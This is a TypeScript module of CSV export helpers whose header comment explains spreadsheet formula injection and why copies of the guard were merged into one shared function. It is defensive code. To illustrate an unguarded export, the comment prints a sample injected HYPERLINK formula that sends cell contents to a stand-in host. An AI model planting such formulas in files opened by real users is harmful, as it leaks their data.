// =============================================================================
// ONE way to write a CSV cell
// =============================================================================
// A spreadsheet treats a cell beginning `=`, `+`, `-` or `@` as a FORMULA, and
// quoting does not stop it — `"=HYPERLINK(...)"` is still evaluated when the
// file is opened. So a name typed into this system can become code running on
// the machine of whoever downloads the register (OWASP: CSV injection). The
// defence is to prefix such a value with an apostrophe, which Excel and
// LibreOffice both read as "this is text".
//
// This existed NINE times, under four names — `csvCell` in admin, group,
// fee-ops, timetable and platform-audit; `esc` in analytics, payroll (twice)
// and library; `cell` in operator-payments. Every copy was correct.
//
// And the tenth export did not have one at all. `GET /classes/:classId/
// roster.csv` built its rows inline, quoting the name and interpolating the
// email raw. Proven against the running system by renaming one pupil and
// downloading two exports:
//
//     students.csv   "1","'=HYPERLINK(""http://x/""&A1,""clickme"")",…
//     roster.csv     1,"=HYPERLINK(""http://x/""&A1,""clickme"")",vol.s283@…
//
// Same pupil, same name: the admin export neutralises it, the class register
// hands a live formula to whichever teacher opens the file.
//
// That is what nine copies of a security control buy you — not one of them
// wrong, and the one place that needed it most simply never got a copy. Hence
// one function, imported, with a test that fails when the tenth is written.
// =============================================================================

/**
 * One CSV cell: formula-neutralised, then quoted.
 *
 * `null`/`undefined` become an empty cell rather than the strings "null" or
 * "undefined", which is what a reader expects of a blank.
 */
export function csvCell(value: unknown): string {
  const s = value === null || value === undefined ? "" : String(value);
  // A leading tab or CR does the same job as `=` in some spreadsheets, and is
  // invisible in the source data — kept from the copies this replaces.
  const guarded = /^[=+\-@\t\r]/.test(s) ? `'${s}` : s;
  return `"${guarded.replace(/"/g, '""')}"`;
}

/** One CSV line from its cells. */
export function csvRow(cells: readonly unknown[]): string {
  return cells.map(csvCell).join(",");
}

/**
 * A whole CSV: header row + body rows, newline-terminated.
 *
 * Trailing newline included because a file without one appends the next
 * paste to the last row when a school concatenates exports.
 */
export function csvDocument(header: readonly unknown[], rows: readonly (readonly unknown[])[]): string {
  return [csvRow(header), ...rows.map(csvRow)].join("\n") + "\n";
}
